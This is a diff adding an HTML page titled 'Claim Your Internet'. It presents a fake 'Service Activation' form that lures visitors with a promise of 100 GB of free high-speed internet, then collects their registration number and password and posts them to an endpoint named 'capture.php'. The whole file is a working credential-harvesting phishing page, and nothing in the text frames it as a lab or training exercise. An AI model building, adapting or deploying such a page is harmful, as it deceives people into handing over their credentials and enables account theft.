@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Internet</title>
+    <style>
+        /* Basic CSS for styling the page */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 2rem 2.5rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #1c1e21;
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #4b4f56;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            box-sizing: border-box; /* Ensures padding doesn't affect overall width */
+            font-size: 1rem;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.25);
+        }
+        
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 0.5rem;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+        
+        .info-text {
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: #606770;
+            line-height: 1.4;
+        }
+
+        .info-text strong {
+            color: #d9534f; /* A distinct color for the note */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Service Activation</h2>
+        <form action="capture.php" method="post">
+            <div class="input-group">
+                <label for="reg-number">Registration Number</label>
+                <input type="text" id="reg-number" name="registration_number" placeholder="Enter your registration number" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit">Activate</button>
+        </form>
+        <p class="info-text">
+            You will only get 100 GB of high speed internet. <br>
+            <strong>Note:</strong> One time use only
+        </p>
+    </div>
+</body>
+</html>
